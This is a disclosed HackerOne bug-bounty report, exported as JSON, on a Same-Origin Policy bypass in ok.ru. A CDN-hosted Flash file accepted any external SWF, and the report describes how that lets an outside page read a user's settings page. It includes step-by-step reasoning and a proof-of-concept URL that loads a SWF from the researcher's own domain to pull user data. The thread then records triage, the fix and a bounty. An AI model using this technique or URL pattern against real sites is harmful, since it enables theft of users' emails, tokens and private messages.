{"id":102234,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIyMzQ=","url":"https://hackerone.com/reports/102234","title":"Same-Origin Policy bypass on main domain - ok.ru","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-11-27T01:32:29.934Z","submitted_at":"2015-11-27T01:32:29.934Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zoczus","url":"/zoczus","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1782,"url":"https://hackerone.com/ok","handle":"ok","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"ok.ru","twitter_handle":"","website":"http://ok.ru","about":"Odnoklassniki social network"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-05-04T12:32:10.263Z","bug_reporter_agreed_on_going_public_at":"2016-05-04T12:32:10.185Z","team_member_agreed_on_going_public_at":"2016-05-04T09:08:32.116Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nI've just found a way to bypass Same-Origin Policy mechanism using vulnerability in one of swf files on your cdn. Let me explain this in details:\n\n1. First of all - your Crossdomain which defines from what domains Flash files can read content on ok.ru. Crossdomain file is located here - http://ok.ru/crossdomain.xml\n\n2. We need to find some vulnerable swf file on any of domains listed in crossdomain file.\n\n3. I've found this shiny beauty: http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf \n\n4.  Flashbang Tool recognized that there are two parameters needed - \"vpaidSwfUrl\" and \"Loader\"\n\n5. Decompilation of swf shows that Security.allowDomain(\"*\") is used - so we can interact with this Flash file from any domain. \n\n6. vpaidSwfUrl is not controlled at all, and it loads and executes any external SWF. So we can use our malicious one to prepare attack. \n\n7. Our loaded and executed SWF from st.mycdn.me domain will make request to http://ok.ru/settings , read its content and send to javascript function in attacker controled origin. \n\n8. Profit - attacker gained information, whitout any user interaction. Now he can steal such sensitive data as user's e-mail, csrf tokens, private messages, and so on.\n\nVulnerable file that loads content from ok.ru (can be viewed in browser Developer's console): http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings\u0026Loader=test\n\nProof of Concept that loads http://ok.ru/settings page and put it as innerHTML of div element of domain that I control (ropchain.org): http://ropchain.org/poc/ok.html\n\nI hope that everything is clear enough, but if not - please tell me, and I'll try to prepare better explaination, I'm also able to prepare video demonstration if you need one. Also if you have any other questions - feel free to ask me. \n\nHave a great day! \nJakub Zoczek","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve just found a way to bypass Same-Origin Policy mechanism using vulnerability in one of swf files on your cdn. Let me explain this in details:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eFirst of all - your Crossdomain which defines from what domains Flash files can read content on ok.ru. Crossdomain file is located here - \u003ca title=\"http://ok.ru/crossdomain.xml\" href=\"/redirect?url=http%3A%2F%2Fok.ru%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://ok.ru/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWe need to find some vulnerable swf file on any of domains listed in crossdomain file.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eI\u0026#39;ve found this shiny beauty: \u003ca title=\"http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf\" href=\"/redirect?url=http%3A%2F%2Fst.mycdn.me%2Fstatic%2FMegaPlayer%2F10-2-21%2Fvpaid-js-interface.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFlashbang Tool recognized that there are two parameters needed - \u0026quot;vpaidSwfUrl\u0026quot; and \u0026quot;Loader\u0026quot;\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eDecompilation of swf shows that Security.allowDomain(\u0026quot;*\u0026quot;) is used - so we can interact with this Flash file from any domain. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003evpaidSwfUrl is not controlled at all, and it loads and executes any external SWF. So we can use our malicious one to prepare attack. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOur loaded and executed SWF from st.mycdn.me domain will make request to \u003ca title=\"http://ok.ru/settings\" href=\"/redirect?url=http%3A%2F%2Fok.ru%2Fsettings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://ok.ru/settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , read its content and send to javascript function in attacker controled origin. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eProfit - attacker gained information, whitout any user interaction. Now he can steal such sensitive data as user\u0026#39;s e-mail, csrf tokens, private messages, and so on.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eVulnerable file that loads content from ok.ru (can be viewed in browser Developer\u0026#39;s console): \u003ca title=\"http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings\u0026amp;Loader=test\" href=\"/redirect?url=http%3A%2F%2Fst.mycdn.me%2Fstatic%2FMegaPlayer%2F10-2-21%2Fvpaid-js-interface.swf%3FvpaidSwfUrl%3Dhttp%3A%2F%2Fropchain.org%2Fpoc%2Fok.swf%3Furl%3Dhttp%3A%2F%2Fok.ru%2Fsettings%26Loader%3Dtest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings\u0026amp;Loader=test\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eProof of Concept that loads \u003ca title=\"http://ok.ru/settings\" href=\"/redirect?url=http%3A%2F%2Fok.ru%2Fsettings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://ok.ru/settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e page and put it as innerHTML of div element of domain that I control (ropchain.org): \u003ca title=\"http://ropchain.org/poc/ok.html\" href=\"/redirect?url=http%3A%2F%2Fropchain.org%2Fpoc%2Fok.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://ropchain.org/poc/ok.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI hope that everything is clear enough, but if not - please tell me, and I\u0026#39;ll try to prepare better explaination, I\u0026#39;m also able to prepare video demonstration if you need one. Also if you have any other questions - feel free to ask me. \u003c/p\u003e\n\n\u003cp\u003eHave a great day! \u003cbr\u003e\nJakub Zoczek\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-03T09:08:32.206Z","allow_singular_disclosure_after":-144270218.60921302,"singular_disclosure_allowed":true,"vote_count":4,"voters":["villagelad","fantam1","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":704119,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi! Thanks for your report. I confirm the issue is valid, we will fix it and let you know.","markdown_message":"\u003cp\u003eHi! Thanks for your report. I confirm the issue is valid, we will fix it and let you know.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-01T12:43:47.896Z","updated_at":"2015-12-01T12:43:47.896Z","actor":{"username":"alexandra_ok","cleared":false,"url":"/alexandra_ok","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":765077,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, any updates?","markdown_message":"\u003cp\u003eHi, any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-20T12:20:21.087Z","updated_at":"2016-01-20T12:20:21.087Z","actor":{"username":"zoczus","cleared":false,"url":"/zoczus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":779547,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi! No updates yet unfortunately. This is a high priority issue, and I will inform you as soon as it is resolved.  ","markdown_message":"\u003cp\u003eHi! No updates yet unfortunately. This is a high priority issue, and I will inform you as soon as it is resolved.  \u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-01T17:25:01.556Z","updated_at":"2016-02-01T17:25:01.556Z","actor":{"username":"alexandra_ok","cleared":false,"url":"/alexandra_ok","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":779583,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"All right, thank you!","markdown_message":"\u003cp\u003eAll right, thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-01T17:36:52.830Z","updated_at":"2016-02-01T17:36:52.830Z","actor":{"username":"zoczus","cleared":false,"url":"/zoczus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":789471,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi! This problem has been fixed in source code, and besides this the swf has been moved to another domain http://r.mradx.net/img/FD/C222D8.swf. Please confirm the issue is resolved.","markdown_message":"\u003cp\u003eHi! This problem has been fixed in source code, and besides this the swf has been moved to another domain \u003ca title=\"http://r.mradx.net/img/FD/C222D8.swf\" href=\"/redirect?url=http%3A%2F%2Fr.mradx.net%2Fimg%2FFD%2FC222D8.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://r.mradx.net/img/FD/C222D8.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Please confirm the issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-08T18:07:49.972Z","updated_at":"2016-02-08T18:07:49.972Z","actor":{"username":"alexandra_ok","cleared":false,"url":"/alexandra_ok","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":789661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nYes, this solution looks fine for me.  :) so issue resolved. \n\nHave a nice day,\nJZ","markdown_message":"\u003cp\u003eHello!\u003c/p\u003e\n\n\u003cp\u003eYes, this solution looks fine for me.  :) so issue resolved. \u003c/p\u003e\n\n\u003cp\u003eHave a nice day,\u003cbr\u003e\nJZ\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-08T20:14:16.861Z","updated_at":"2016-02-08T20:14:16.861Z","actor":{"username":"zoczus","cleared":false,"url":"/zoczus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":791012,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Great, thanks for the report.","markdown_message":"\u003cp\u003eGreat, thanks for the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-09T16:24:16.309Z","updated_at":"2016-02-09T16:24:16.309Z","actor":{"username":"alexandra_ok","cleared":false,"url":"/alexandra_ok","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"zoczus","url":"/zoczus"},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":791017,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-02-09T16:25:18.884Z","updated_at":"2016-02-09T16:25:18.884Z","actor":{"url":"/ok","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"ok.ru"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ok","collaborator":{"username":"zoczus","url":"/zoczus"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":939886,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-04T09:08:32.155Z","updated_at":"2016-05-04T09:08:32.155Z","first_to_agree":true,"actor":{"username":"alexandra_ok","cleared":false,"url":"/alexandra_ok","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":940119,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-04T12:32:10.217Z","updated_at":"2016-05-04T12:32:10.217Z","actor":{"username":"zoczus","cleared":false,"url":"/zoczus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940120,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-04T12:32:10.283Z","updated_at":"2016-05-04T12:32:10.283Z","actor":{"username":"zoczus","cleared":false,"url":"/zoczus","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ok","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}